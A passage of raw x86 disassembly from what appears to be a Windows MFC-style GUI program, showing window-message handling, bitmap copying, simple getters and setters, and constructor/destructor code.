  40250a:	85 db                	test   %ebx,%ebx
  40250c:	75 08                	jne    0x402516
  40250e:	8b b6 bc 00 00 00    	mov    0xbc(%esi),%esi
  402514:	eb 06                	jmp    0x40251c
  402516:	8b b6 b8 00 00 00    	mov    0xb8(%esi),%esi
  40251c:	8b 54 24 0c          	mov    0xc(%esp),%edx
  402520:	8b 44 24 10          	mov    0x10(%esp),%eax
  402524:	8b 5c 24 34          	mov    0x34(%esp),%ebx
  402528:	2b ca                	sub    %edx,%ecx
  40252a:	2b f8                	sub    %eax,%edi
  40252c:	f7 db                	neg    %ebx
  40252e:	1b db                	sbb    %ebx,%ebx
  402530:	83 e3 20             	and    $0x20,%ebx
  402533:	83 cb 03             	or     $0x3,%ebx
  402536:	53                   	push   %ebx
  402537:	57                   	push   %edi
  402538:	51                   	push   %ecx
  402539:	8b 4c 24 2c          	mov    0x2c(%esp),%ecx
  40253d:	50                   	push   %eax
  40253e:	52                   	push   %edx
  40253f:	8b 51 04             	mov    0x4(%ecx),%edx
  402542:	6a 00                	push   $0x0
  402544:	56                   	push   %esi
  402545:	6a 00                	push   $0x0
  402547:	6a 00                	push   $0x0
  402549:	52                   	push   %edx
  40254a:	ff 15 60 86 41 00    	call   *0x418660
  402550:	5f                   	pop    %edi
  402551:	5e                   	pop    %esi
  402552:	5b                   	pop    %ebx
  402553:	83 c4 10             	add    $0x10,%esp
  402556:	c2 18 00             	ret    $0x18
  402559:	90                   	nop
  40255a:	90                   	nop
  40255b:	90                   	nop
  40255c:	90                   	nop
  40255d:	90                   	nop
  40255e:	90                   	nop
  40255f:	90                   	nop
  402560:	56                   	push   %esi
  402561:	8b f1                	mov    %ecx,%esi
  402563:	6a f0                	push   $0xfffffff0
  402565:	8b 46 20             	mov    0x20(%esi),%eax
  402568:	50                   	push   %eax
  402569:	ff 15 40 86 41 00    	call   *0x418640
  40256f:	25 ff 00 00 00       	and    $0xff,%eax
  402574:	a8 01                	test   $0x1,%al
  402576:	74 0a                	je     0x402582
  402578:	c7 86 e4 00 00 00 01 	movl   $0x1,0xe4(%esi)
  40257f:	00 00 00 
  402582:	8b 4e 20             	mov    0x20(%esi),%ecx
  402585:	0c 0b                	or     $0xb,%al
  402587:	6a 01                	push   $0x1
  402589:	50                   	push   %eax
  40258a:	68 f4 00 00 00       	push   $0xf4
  40258f:	51                   	push   %ecx
  402590:	ff 15 5c 86 41 00    	call   *0x41865c
  402596:	8b ce                	mov    %esi,%ecx
  402598:	5e                   	pop    %esi
  402599:	e9 b4 19 01 00       	jmp    0x413f52
  40259e:	90                   	nop
  40259f:	90                   	nop
  4025a0:	56                   	push   %esi
  4025a1:	57                   	push   %edi
  4025a2:	8b f1                	mov    %ecx,%esi
  4025a4:	e8 27 02 00 00       	call   0x4027d0
  4025a9:	8b 7c 24 0c          	mov    0xc(%esp),%edi
  4025ad:	8b 46 7c             	mov    0x7c(%esi),%eax
  4025b0:	57                   	push   %edi
  4025b1:	6a 00                	push   $0x0
  4025b3:	68 07 04 00 00       	push   $0x407
  4025b8:	50                   	push   %eax
  4025b9:	ff 15 5c 86 41 00    	call   *0x41865c
  4025bf:	57                   	push   %edi
  4025c0:	8b ce                	mov    %esi,%ecx
  4025c2:	e8 27 1a 01 00       	call   0x413fee
  4025c7:	5f                   	pop    %edi
  4025c8:	5e                   	pop    %esi
  4025c9:	c2 04 00             	ret    $0x4
  4025cc:	90                   	nop
  4025cd:	90                   	nop
  4025ce:	90                   	nop
  4025cf:	90                   	nop
  4025d0:	8b 44 24 04          	mov    0x4(%esp),%eax
  4025d4:	3d 03 02 00 00       	cmp    $0x203,%eax
  4025d9:	75 05                	jne    0x4025e0
  4025db:	b8 01 02 00 00       	mov    $0x201,%eax
  4025e0:	89 44 24 04          	mov    %eax,0x4(%esp)
  4025e4:	e9 03 19 01 00       	jmp    0x413eec
  4025e9:	90                   	nop
  4025ea:	90                   	nop
  4025eb:	90                   	nop
  4025ec:	90                   	nop
  4025ed:	90                   	nop
  4025ee:	90                   	nop
  4025ef:	90                   	nop
  4025f0:	56                   	push   %esi
  4025f1:	6a 0f                	push   $0xf
  4025f3:	8b f1                	mov    %ecx,%esi
  4025f5:	ff 15 54 86 41 00    	call   *0x418654
  4025fb:	89 86 e8 00 00 00    	mov    %eax,0xe8(%esi)
  402601:	8b 44 24 08          	mov    0x8(%esp),%eax
  402605:	83 f8 01             	cmp    $0x1,%eax
  402608:	75 0e                	jne    0x402618
  40260a:	8b 46 20             	mov    0x20(%esi),%eax
  40260d:	6a 01                	push   $0x1
  40260f:	6a 00                	push   $0x0
  402611:	50                   	push   %eax
  402612:	ff 15 84 86 41 00    	call   *0x418684
  402618:	5e                   	pop    %esi
  402619:	c2 04 00             	ret    $0x4
  40261c:	90                   	nop
  40261d:	90                   	nop
  40261e:	90                   	nop
  40261f:	90                   	nop
  402620:	8b 81 e8 00 00 00    	mov    0xe8(%ecx),%eax
  402626:	c3                   	ret
  402627:	90                   	nop
  402628:	90                   	nop
  402629:	90                   	nop
  40262a:	90                   	nop
  40262b:	90                   	nop
  40262c:	90                   	nop
  40262d:	90                   	nop
  40262e:	90                   	nop
  40262f:	90                   	nop
  402630:	56                   	push   %esi
  402631:	6a 12                	push   $0x12
  402633:	8b f1                	mov    %ecx,%esi
  402635:	ff 15 54 86 41 00    	call   *0x418654
  40263b:	89 86 ec 00 00 00    	mov    %eax,0xec(%esi)
  402641:	8b 44 24 08          	mov    0x8(%esp),%eax
  402645:	83 f8 01             	cmp    $0x1,%eax
  402648:	75 0e                	jne    0x402658
  40264a:	8b 46 20             	mov    0x20(%esi),%eax
  40264d:	6a 01                	push   $0x1
  40264f:	6a 00                	push   $0x0
  402651:	50                   	push   %eax
  402652:	ff 15 84 86 41 00    	call   *0x418684
  402658:	5e                   	pop    %esi
  402659:	c2 04 00             	ret    $0x4
  40265c:	90                   	nop
  40265d:	90                   	nop
  40265e:	90                   	nop
  40265f:	90                   	nop
  402660:	8b 81 ec 00 00 00    	mov    0xec(%ecx),%eax
  402666:	c3                   	ret
  402667:	90                   	nop
  402668:	90                   	nop
  402669:	90                   	nop
  40266a:	90                   	nop
  40266b:	90                   	nop
  40266c:	90                   	nop
  40266d:	90                   	nop
  40266e:	90                   	nop
  40266f:	90                   	nop
  402670:	56                   	push   %esi
  402671:	6a 0f                	push   $0xf
  402673:	8b f1                	mov    %ecx,%esi
  402675:	ff 15 54 86 41 00    	call   *0x418654
  40267b:	89 86 f0 00 00 00    	mov    %eax,0xf0(%esi)
  402681:	8b 44 24 08          	mov    0x8(%esp),%eax
  402685:	83 f8 01             	cmp    $0x1,%eax
  402688:	75 0e                	jne    0x402698
  40268a:	8b 46 20             	mov    0x20(%esi),%eax
  40268d:	6a 01                	push   $0x1
  40268f:	6a 00                	push   $0x0
  402691:	50                   	push   %eax
  402692:	ff 15 84 86 41 00    	call   *0x418684
  402698:	5e                   	pop    %esi
  402699:	c2 04 00             	ret    $0x4
  40269c:	90                   	nop
  40269d:	90                   	nop
  40269e:	90                   	nop
  40269f:	90                   	nop
  4026a0:	8b 81 f0 00 00 00    	mov    0xf0(%ecx),%eax
  4026a6:	c3                   	ret
  4026a7:	90                   	nop
  4026a8:	90                   	nop
  4026a9:	90                   	nop
  4026aa:	90                   	nop
  4026ab:	90                   	nop
  4026ac:	90                   	nop
  4026ad:	90                   	nop
  4026ae:	90                   	nop
  4026af:	90                   	nop
  4026b0:	56                   	push   %esi
  4026b1:	6a 12                	push   $0x12
  4026b3:	8b f1                	mov    %ecx,%esi
  4026b5:	ff 15 54 86 41 00    	call   *0x418654
  4026bb:	89 86 f4 00 00 00    	mov    %eax,0xf4(%esi)
  4026c1:	8b 44 24 08          	mov    0x8(%esp),%eax
  4026c5:	83 f8 01             	cmp    $0x1,%eax
  4026c8:	75 0e                	jne    0x4026d8
  4026ca:	8b 46 20             	mov    0x20(%esi),%eax
  4026cd:	6a 01                	push   $0x1
  4026cf:	6a 00                	push   $0x0
  4026d1:	50                   	push   %eax
  4026d2:	ff 15 84 86 41 00    	call   *0x418684
  4026d8:	5e                   	pop    %esi
  4026d9:	c2 04 00             	ret    $0x4
  4026dc:	90                   	nop
  4026dd:	90                   	nop
  4026de:	90                   	nop
  4026df:	90                   	nop
  4026e0:	8b 44 24 04          	mov    0x4(%esp),%eax
  4026e4:	89 81 f4 00 00 00    	mov    %eax,0xf4(%ecx)
  4026ea:	8b 44 24 08          	mov    0x8(%esp),%eax
  4026ee:	83 f8 01             	cmp    $0x1,%eax
  4026f1:	75 0e                	jne    0x402701
  4026f3:	8b 49 20             	mov    0x20(%ecx),%ecx
  4026f6:	6a 01                	push   $0x1
  4026f8:	6a 00                	push   $0x0
  4026fa:	51                   	push   %ecx
  4026fb:	ff 15 84 86 41 00    	call   *0x418684
  402701:	c2 08 00             	ret    $0x8
  402704:	90                   	nop
  402705:	90                   	nop
  402706:	90                   	nop
  402707:	90                   	nop
  402708:	90                   	nop
  402709:	90                   	nop
  40270a:	90                   	nop
  40270b:	90                   	nop
  40270c:	90                   	nop
  40270d:	90                   	nop
  40270e:	90                   	nop
  40270f:	90                   	nop
  402710:	8b 81 f4 00 00 00    	mov    0xf4(%ecx),%eax
  402716:	c3                   	ret
  402717:	90                   	nop
  402718:	90                   	nop
  402719:	90                   	nop
  40271a:	90                   	nop
  40271b:	90                   	nop
  40271c:	90                   	nop
  40271d:	90                   	nop
  40271e:	90                   	nop
  40271f:	90                   	nop
  402720:	8b 41 58             	mov    0x58(%ecx),%eax
  402723:	85 c0                	test   %eax,%eax
  402725:	74 0f                	je     0x402736
  402727:	50                   	push   %eax
  402728:	ff 15 3c 86 41 00    	call   *0x41863c
  40272e:	b8 01 00 00 00       	mov    $0x1,%eax
  402733:	c2 0c 00             	ret    $0xc
  402736:	e8 25 19 01 00       	call   0x414060
  40273b:	c2 0c 00             	ret    $0xc
  40273e:	90                   	nop
  40273f:	90                   	nop
  402740:	83 ec 10             	sub    $0x10,%esp
  402743:	56                   	push   %esi
  402744:	57                   	push   %edi
  402745:	8b 7c 24 1c          	mov    0x1c(%esp),%edi
  402749:	8b f1                	mov    %ecx,%esi
  40274b:	85 ff                	test   %edi,%edi
  40274d:	74 62                	je     0x4027b1
  40274f:	53                   	push   %ebx
  402750:	e8 7b 00 00 00       	call   0x4027d0
  402755:	8b 46 7c             	mov    0x7c(%esi),%eax
  402758:	8b 1d 5c 86 41 00    	mov    0x41865c,%ebx
  40275e:	6a 00                	push   $0x0
  402760:	6a 00                	push   $0x0
  402762:	68 0d 04 00 00       	push   $0x40d
  402767:	50                   	push   %eax
  402768:	ff d3                	call   *%ebx
  40276a:	85 c0                	test   %eax,%eax
  40276c:	75 22                	jne    0x402790
  40276e:	8b 56 20             	mov    0x20(%esi),%edx
  402771:	8d 4c 24 0c          	lea    0xc(%esp),%ecx
  402775:	51                   	push   %ecx
  402776:	52                   	push   %edx
  402777:	ff 15 38 86 41 00    	call   *0x418638
  40277d:	8b 0f                	mov    (%edi),%ecx
  40277f:	8d 44 24 0c          	lea    0xc(%esp),%eax
  402783:	6a 01                	push   $0x1
  402785:	50                   	push   %eax
  402786:	51                   	push   %ecx
  402787:	56                   	push   %esi
  402788:	8d 4e 5c             	lea    0x5c(%esi),%ecx
  40278b:	e8 a2 19 01 00       	call   0x414132
  402790:	8b 17                	mov    (%edi),%edx
  402792:	6a 01                	push   $0x1
  402794:	56                   	push   %esi
  402795:	52                   	push   %edx
  402796:	8d 4e 5c             	lea    0x5c(%esi),%ecx
  402799:	e8 8e 19 01 00       	call   0x41412c
  40279e:	8b 44 24 24          	mov    0x24(%esp),%eax
  4027a2:	8b 4e 7c             	mov    0x7c(%esi),%ecx
  4027a5:	6a 00                	push   $0x0
  4027a7:	50                   	push   %eax
  4027a8:	68 01 04 00 00       	push   $0x401
  4027ad:	51                   	push   %ecx
  4027ae:	ff d3                	call   *%ebx
  4027b0:	5b                   	pop    %ebx
  4027b1:	5f                   	pop    %edi
  4027b2:	5e                   	pop    %esi
  4027b3:	83 c4 10             	add    $0x10,%esp
  4027b6:	c2 08 00             	ret    $0x8
  4027b9:	90                   	nop
  4027ba:	90                   	nop
  4027bb:	90                   	nop
  4027bc:	90                   	nop
  4027bd:	90                   	nop
  4027be:	90                   	nop
  4027bf:	90                   	nop
  4027c0:	8b 81 e4 00 00 00    	mov    0xe4(%ecx),%eax
  4027c6:	c3                   	ret
  4027c7:	90                   	nop
  4027c8:	90                   	nop
  4027c9:	90                   	nop
  4027ca:	90                   	nop
  4027cb:	90                   	nop
  4027cc:	90                   	nop
  4027cd:	90                   	nop
  4027ce:	90                   	nop
  4027cf:	90                   	nop
  4027d0:	56                   	push   %esi
  4027d1:	8b f1                	mov    %ecx,%esi
  4027d3:	8b 46 7c             	mov    0x7c(%esi),%eax
  4027d6:	85 c0                	test   %eax,%eax
  4027d8:	75 1e                	jne    0x4027f8
  4027da:	6a 00                	push   $0x0
  4027dc:	56                   	push   %esi
  4027dd:	8d 4e 5c             	lea    0x5c(%esi),%ecx
  4027e0:	e8 59 19 01 00       	call   0x41413e
  4027e5:	8b 46 7c             	mov    0x7c(%esi),%eax
  4027e8:	6a 00                	push   $0x0
  4027ea:	6a 00                	push   $0x0
  4027ec:	68 01 04 00 00       	push   $0x401
  4027f1:	50                   	push   %eax
  4027f2:	ff 15 5c 86 41 00    	call   *0x41865c
  4027f8:	5e                   	pop    %esi
  4027f9:	c3                   	ret
  4027fa:	90                   	nop
  4027fb:	90                   	nop
  4027fc:	90                   	nop
  4027fd:	90                   	nop
  4027fe:	90                   	nop
  4027ff:	90                   	nop
  402800:	6a ff                	push   $0xffffffff
  402802:	68 38 4b 41 00       	push   $0x414b38
  402807:	64 a1 00 00 00 00    	mov    %fs:0x0,%eax
  40280d:	50                   	push   %eax
  40280e:	64 89 25 00 00 00 00 	mov    %esp,%fs:0x0
  402815:	83 ec 34             	sub    $0x34,%esp
  402818:	53                   	push   %ebx
  402819:	56                   	push   %esi
  40281a:	8b f1                	mov    %ecx,%esi
  40281c:	57                   	push   %edi
  40281d:	8b 3d 6c 86 41 00    	mov    0x41866c,%edi
  402823:	8b 46 20             	mov    0x20(%esi),%eax
  402826:	50                   	push   %eax
  402827:	ff d7                	call   *%edi
  402829:	50                   	push   %eax
  40282a:	e8 2b 18 01 00       	call   0x41405a
  40282f:	50                   	push   %eax
  402830:	8d 4c 24 30          	lea    0x30(%esp),%ecx
  402834:	e8 1d 19 01 00       	call   0x414156
  402839:	8b 56 20             	mov    0x20(%esi),%edx
  40283c:	8d 4c 24 0c          	lea    0xc(%esp),%ecx
  402840:	51                   	push   %ecx
  402841:	52                   	push   %edx
  402842:	c7 44 24 50 00 00 00 	movl   $0x0,0x50(%esp)
  402849:	00 
  40284a:	ff 15 38 86 41 00    	call   *0x418638
  402850:	8b 4e 20             	mov    0x20(%esi),%ecx
  402853:	8d 44 24 1c          	lea    0x1c(%esp),%eax
  402857:	50                   	push   %eax
  402858:	51                   	push   %ecx
  402859:	ff 15 a0 86 41 00    	call   *0x4186a0
  40285f:	8b 46 20             	mov    0x20(%esi),%eax
  402862:	8d 54 24 1c          	lea    0x1c(%esp),%edx
  402866:	52                   	push   %edx
  402867:	50                   	push   %eax
  402868:	ff d7                	call   *%edi
  40286a:	50                   	push   %eax
  40286b:	e8 ea 17 01 00       	call   0x41405a
  402870:	8b c8                	mov    %eax,%ecx
  402872:	e8 d9 18 01 00       	call   0x414150
  402877:	8b 86 c8 00 00 00    	mov    0xc8(%esi),%eax
  40287d:	8b 1d 5c 80 41 00    	mov    0x41805c,%ebx
  402883:	85 c0                	test   %eax,%eax
  402885:	0f 85 97 00 00 00    	jne    0x402922
  40288b:	8b 4c 24 30          	mov    0x30(%esp),%ecx
  40288f:	51                   	push   %ecx
  402890:	ff 15 54 80 41 00    	call   *0x418054
  402896:	50                   	push   %eax
  402897:	8d 8e c4 00 00 00    	lea    0xc4(%esi),%ecx
  40289d:	e8 7e 18 01 00       	call   0x414120
  4028a2:	8b 44 24 18          	mov    0x18(%esp),%eax
  4028a6:	8b 4c 24 10          	mov    0x10(%esp),%ecx
  4028aa:	8b 7c 24 0c          	mov    0xc(%esp),%edi
  4028ae:	8b 54 24 30          	mov    0x30(%esp),%edx
  4028b2:	2b c1                	sub    %ecx,%eax
  4028b4:	8b 4c 24 14          	mov    0x14(%esp),%ecx
  4028b8:	2b cf                	sub    %edi,%ecx
  4028ba:	50                   	push   %eax
  4028bb:	51                   	push   %ecx
  4028bc:	52                   	push   %edx
  4028bd:	8d be d4 00 00 00    	lea    0xd4(%esi),%edi
  4028c3:	ff 15 50 80 41 00    	call   *0x418050
  4028c9:	50                   	push   %eax
  4028ca:	8b cf                	mov    %edi,%ecx
  4028cc:	e8 79 18 01 00       	call   0x41414a
  4028d1:	85 ff                	test   %edi,%edi
  4028d3:	74 03                	je     0x4028d8
  4028d5:	8b 7f 04             	mov    0x4(%edi),%edi
  4028d8:	8b 86 c8 00 00 00    	mov    0xc8(%esi),%eax
  4028de:	57                   	push   %edi
  4028df:	50                   	push   %eax
  4028e0:	e8 6f 17 01 00       	call   0x414054
  4028e5:	8b 54 24 20          	mov    0x20(%esp),%edx
  4028e9:	8b 4c 24 10          	mov    0x10(%esp),%ecx
  4028ed:	8b 7c 24 0c          	mov    0xc(%esp),%edi
  4028f1:	68 20 00 cc 00       	push   $0xcc0020
  4028f6:	89 86 dc 00 00 00    	mov    %eax,0xdc(%esi)
  4028fc:	8b 44 24 1c          	mov    0x1c(%esp),%eax
  402900:	52                   	push   %edx
  402901:	8b 54 24 24          	mov    0x24(%esp),%edx
  402905:	2b c1                	sub    %ecx,%eax
  402907:	8b 4c 24 1c          	mov    0x1c(%esp),%ecx
  40290b:	52                   	push   %edx
  40290c:	8b 54 24 3c          	mov    0x3c(%esp),%edx
  402910:	2b cf                	sub    %edi,%ecx
  402912:	52                   	push   %edx
  402913:	50                   	push   %eax
  402914:	8b 86 c8 00 00 00    	mov    0xc8(%esi),%eax
  40291a:	51                   	push   %ecx
  40291b:	6a 00                	push   $0x0
  40291d:	6a 00                	push   $0x0
  40291f:	50                   	push   %eax
  402920:	ff d3                	call   *%ebx
  402922:	8b 44 24 18          	mov    0x18(%esp),%eax
  402926:	8b 4c 24 10          	mov    0x10(%esp),%ecx
  40292a:	8b 7c 24 0c          	mov    0xc(%esp),%edi
  40292e:	2b c1                	sub    %ecx,%eax
  402930:	8b 4c 24 14          	mov    0x14(%esp),%ecx
  402934:	8d 96 c4 00 00 00    	lea    0xc4(%esi),%edx
  40293a:	2b cf                	sub    %edi,%ecx
  40293c:	85 d2                	test   %edx,%edx
  40293e:	74 03                	je     0x402943
  402940:	8b 52 04             	mov    0x4(%edx),%edx
  402943:	68 20 00 cc 00       	push   $0xcc0020
  402948:	6a 00                	push   $0x0
  40294a:	6a 00                	push   $0x0
  40294c:	52                   	push   %edx
  40294d:	50                   	push   %eax
  40294e:	51                   	push   %ecx
  40294f:	8b 4c 24 68          	mov    0x68(%esp),%ecx
  402953:	6a 00                	push   $0x0
  402955:	6a 00                	push   $0x0
  402957:	8b 51 04             	mov    0x4(%ecx),%edx
  40295a:	52                   	push   %edx
  40295b:	ff d3                	call   *%ebx
  40295d:	8d 4c 24 2c          	lea    0x2c(%esp),%ecx
  402961:	c7 44 24 48 ff ff ff 	movl   $0xffffffff,0x48(%esp)
  402968:	ff 
  402969:	e8 d6 17 01 00       	call   0x414144
  40296e:	8b 4c 24 40          	mov    0x40(%esp),%ecx
  402972:	5f                   	pop    %edi
  402973:	5e                   	pop    %esi
  402974:	5b                   	pop    %ebx
  402975:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
  40297c:	83 c4 40             	add    $0x40,%esp
  40297f:	c2 04 00             	ret    $0x4
  402982:	90                   	nop
  402983:	90                   	nop
  402984:	90                   	nop
  402985:	90                   	nop
  402986:	90                   	nop
  402987:	90                   	nop
  402988:	90                   	nop
  402989:	90                   	nop
  40298a:	90                   	nop
  40298b:	90                   	nop
  40298c:	90                   	nop
  40298d:	90                   	nop
  40298e:	90                   	nop
  40298f:	90                   	nop
  402990:	8a 44 24 04          	mov    0x4(%esp),%al
  402994:	56                   	push   %esi
  402995:	8b f1                	mov    %ecx,%esi
  402997:	a8 01                	test   $0x1,%al
  402999:	c7 06 f4 89 41 00    	movl   $0x4189f4,(%esi)
  40299f:	74 09                	je     0x4029aa
  4029a1:	56                   	push   %esi
  4029a2:	e8 09 15 01 00       	call   0x413eb0
  4029a7:	83 c4 04             	add    $0x4,%esp
  4029aa:	8b c6                	mov    %esi,%eax
  4029ac:	5e                   	pop    %esi
  4029ad:	c2 04 00             	ret    $0x4
  4029b0:	c7 01 f4 89 41 00    	movl   $0x4189f4,(%ecx)
  4029b6:	c3                   	ret
  4029b7:	90                   	nop
  4029b8:	90                   	nop
  4029b9:	90                   	nop
  4029ba:	90                   	nop
  4029bb:	90                   	nop
  4029bc:	90                   	nop
  4029bd:	90                   	nop
  4029be:	90                   	nop
  4029bf:	90                   	nop
  4029c0:	8b c1                	mov    %ecx,%eax
  4029c2:	c7 00 08 8a 41 00    	movl   $0x418a08,(%eax)
  4029c8:	c7 40 04 00 00 00 00 	movl   $0x0,0x4(%eax)
  4029cf:	c3                   	ret
  4029d0:	56                   	push   %esi
  4029d1:	8b f1                	mov    %ecx,%esi
  4029d3:	e8 18 00 00 00       	call   0x4029f0
  4029d8:	f6 44 24 08 01       	testb  $0x1,0x8(%esp)
  4029dd:	74 09                	je     0x4029e8
  4029df:	56                   	push   %esi
  4029e0:	e8 cb 14 01 00       	call   0x413eb0
  4029e5:	83 c4 04             	add    $0x4,%esp
  4029e8:	8b c6                	mov    %esi,%eax
  4029ea:	5e                   	pop    %esi
  4029eb:	c2 04 00             	ret    $0x4
  4029ee:	90                   	nop
  4029ef:	90                   	nop
  4029f0:	6a ff                	push   $0xffffffff
  4029f2:	68 58 4b 41 00       	push   $0x414b58
  4029f7:	64 a1 00 00 00 00    	mov    %fs:0x0,%eax
  4029fd:	50                   	push   %eax
  4029fe:	64 89 25 00 00 00 00 	mov    %esp,%fs:0x0
  402a05:	51                   	push   %ecx
  402a06:	56                   	push   %esi
  402a07:	8b f1                	mov    %ecx,%esi
  402a09:	89 74 24 04          	mov    %esi,0x4(%esp)
  402a0d:	c7 06 08 8a 41 00    	movl   $0x418a08,(%esi)
  402a13:	c7 44 24 10 00 00 00 	movl   $0x0,0x10(%esp)
  402a1a:	00 
  402a1b:	e8 2e 16 01 00       	call   0x41404e
  402a20:	8b 4c 24 08          	mov    0x8(%esp),%ecx
  402a24:	c7 06 f4 89 41 00    	movl   $0x4189f4,(%esi)
  402a2a:	5e                   	pop    %esi
  402a2b:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
  402a32:	83 c4 10             	add    $0x10,%esp
  402a35:	c3                   	ret
  402a36:	90                   	nop
  402a37:	90                   	nop
  402a38:	90                   	nop
  402a39:	90                   	nop
  402a3a:	90                   	nop
  402a3b:	90                   	nop
  402a3c:	90                   	nop
  402a3d:	90                   	nop
  402a3e:	90                   	nop
  402a3f:	90                   	nop
  402a40:	6a ff                	push   $0xffffffff
  402a42:	68 78 4b 41 00       	push   $0x414b78
  402a47:	64 a1 00 00 00 00    	mov    %fs:0x0,%eax
  402a4d:	50                   	push   %eax
  402a4e:	64 89 25 00 00 00 00 	mov    %esp,%fs:0x0
  402a55:	51                   	push   %ecx
  402a56:	56                   	push   %esi
  402a57:	8b f1                	mov    %ecx,%esi
  402a59:	89 74 24 04          	mov    %esi,0x4(%esp)
  402a5d:	c7 06 08 8a 41 00    	movl   $0x418a08,(%esi)
  402a63:	c7 44 24 10 00 00 00 	movl   $0x0,0x10(%esp)
  402a6a:	00 
  402a6b:	e8 de 15 01 00       	call   0x41404e
  402a70:	8b 4c 24 08          	mov    0x8(%esp),%ecx
  402a74:	c7 06 f4 89 41 00    	movl   $0x4189f4,(%esi)
  402a7a:	5e                   	pop    %esi
  402a7b:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
  402a82:	83 c4 10             	add    $0x10,%esp
  402a85:	c3                   	ret
  402a86:	90                   	nop
  402a87:	90                   	nop
  402a88:	90                   	nop
  402a89:	90                   	nop
  402a8a:	90                   	nop
  402a8b:	90                   	nop
  402a8c:	90                   	nop
  402a8d:	90                   	nop
  402a8e:	90                   	nop
  402a8f:	90                   	nop
  402a90:	6a ff                	push   $0xffffffff
  402a92:	68 98 4b 41 00       	push   $0x414b98
  402a97:	64 a1 00 00 00 00    	mov    %fs:0x0,%eax
  402a9d:	50                   	push   %eax
  402a9e:	64 89 25 00 00 00 00 	mov    %esp,%fs:0x0
  402aa5:	51                   	push   %ecx
  402aa6:	56                   	push   %esi
  402aa7:	8b f1                	mov    %ecx,%esi
  402aa9:	89 74 24 04          	mov    %esi,0x4(%esp)
  402aad:	c7 06 08 8a 41 00    	movl   $0x418a08,(%esi)
  402ab3:	c7 44 24 10 00 00 00 	movl   $0x0,0x10(%esp)
  402aba:	00 
  402abb:	e8 8e 15 01 00       	call   0x41404e
  402ac0:	8b 4c 24 08          	mov    0x8(%esp),%ecx
  402ac4:	c7 06 f4 89 41 00    	movl   $0x4189f4,(%esi)
  402aca:	5e                   	pop    %esi
  402acb:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
  402ad2:	83 c4 10             	add    $0x10,%esp
  402ad5:	c3                   	ret
  402ad6:	90                   	nop
  402ad7:	90                   	nop
  402ad8:	90                   	nop
  402ad9:	90                   	nop
  402ada:	90                   	nop
  402adb:	90                   	nop
  402adc:	90                   	nop
  402add:	90                   	nop
  402ade:	90                   	nop
  402adf:	90                   	nop
  402ae0:	56                   	push   %esi
  402ae1:	8b f1                	mov    %ecx,%esi
  402ae3:	e8 18 00 00 00       	call   0x402b00
  402ae8:	f6 44 24 08 01       	testb  $0x1,0x8(%esp)
  402aed:	74 09                	je     0x402af8
  402aef:	56                   	push   %esi
  402af0:	e8 bb 13 01 00       	call   0x413eb0
  402af5:	83 c4 04             	add    $0x4,%esp
  402af8:	8b c6                	mov    %esi,%eax
  402afa:	5e                   	pop    %esi
  402afb:	c2 04 00             	ret    $0x4
  402afe:	90                   	nop
  402aff:	90                   	nop
  402b00:	6a ff                	push   $0xffffffff
  402b02:	68 b8 4b 41 00       	push   $0x414bb8
  402b07:	64 a1 00 00 00 00    	mov    %fs:0x0,%eax
  402b0d:	50                   	push   %eax
  402b0e:	64 89 25 00 00 00 00 	mov    %esp,%fs:0x0
  402b15:	51                   	push   %ecx
  402b16:	56                   	push   %esi
  402b17:	8b f1                	mov    %ecx,%esi
  402b19:	89 74 24 04          	mov    %esi,0x4(%esp)
  402b1d:	c7 06 08 8a 41 00    	movl   $0x418a08,(%esi)
  402b23:	c7 44 24 10 00 00 00 	movl   $0x0,0x10(%esp)
  402b2a:	00 
  402b2b:	e8 1e 15 01 00       	call   0x41404e
  402b30:	8b 4c 24 08          	mov    0x8(%esp),%ecx
  402b34:	c7 06 f4 89 41 00    	movl   $0x4189f4,(%esi)
  402b3a:	5e                   	pop    %esi
  402b3b:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
  402b42:	83 c4 10             	add    $0x10,%esp
  402b45:	c3                   	ret
  402b46:	90                   	nop
  402b47:	90                   	nop
  402b48:	90                   	nop
  402b49:	90                   	nop
  402b4a:	90                   	nop
  402b4b:	90                   	nop
  402b4c:	90                   	nop
  402b4d:	90                   	nop
  402b4e:	90                   	nop
  402b4f:	90                   	nop
  402b50:	8b 44 24 0c          	mov    0xc(%esp),%eax
  402b54:	8b 54 24 04          	mov    0x4(%esp),%edx
  402b58:	56                   	push   %esi
  402b59:	8b f1                	mov    %ecx,%esi
  402b5b:	8b 4c 24 0c          	mov    0xc(%esp),%ecx
  402b5f:	50                   	push   %eax
  402b60:	8b 42 04             	mov    0x4(%edx),%eax
  402b63:	51                   	push   %ecx
  402b64:	50                   	push   %eax
  402b65:	ff 15 50 80 41 00    	call   *0x418050
  402b6b:	50                   	push   %eax
  402b6c:	8b ce                	mov    %esi,%ecx
  402b6e:	e8 d7 15 01 00       	call   0x41414a
  402b73:	5e                   	pop    %esi
  402b74:	c2 0c 00             	ret    $0xc
  402b77:	90                   	nop
  402b78:	90                   	nop
  402b79:	90                   	nop
  402b7a:	90                   	nop
  402b7b:	90                   	nop
  402b7c:	90                   	nop
  402b7d:	90                   	nop
  402b7e:	90                   	nop
  402b7f:	90                   	nop
  402b80:	8b 44 24 04          	mov    0x4(%esp),%eax
  402b84:	85 c0                	test   %eax,%eax
  402b86:	75 0d                	jne    0x402b95
  402b88:	50                   	push   %eax
  402b89:	8b 41 04             	mov    0x4(%ecx),%eax
  402b8c:	50                   	push   %eax
  402b8d:	e8 c2 14 01 00       	call   0x414054
  402b92:	c2 04 00             	ret    $0x4
  402b95:	8b 40 04             	mov    0x4(%eax),%eax
  402b98:	50                   	push   %eax
  402b99:	8b 41 04             	mov    0x4(%ecx),%eax
  402b9c:	50                   	push   %eax
  402b9d:	e8 b2 14 01 00       	call   0x414054
  402ba2:	c2 04 00             	ret    $0x4
  402ba5:	90                   	nop
  402ba6:	90                   	nop
  402ba7:	90                   	nop
  402ba8:	90                   	nop
  402ba9:	90                   	nop
  402baa:	90                   	nop
  402bab:	90                   	nop
  402bac:	90                   	nop
  402bad:	90                   	nop
  402bae:	90                   	nop
  402baf:	90                   	nop
  402bb0:	8b 44 24 08          	mov    0x8(%esp),%eax
  402bb4:	8b 54 24 04          	mov    0x4(%esp),%edx
  402bb8:	50                   	push   %eax
  402bb9:	8b 41 04             	mov    0x4(%ecx),%eax
  402bbc:	52                   	push   %edx
  402bbd:	50                   	push   %eax
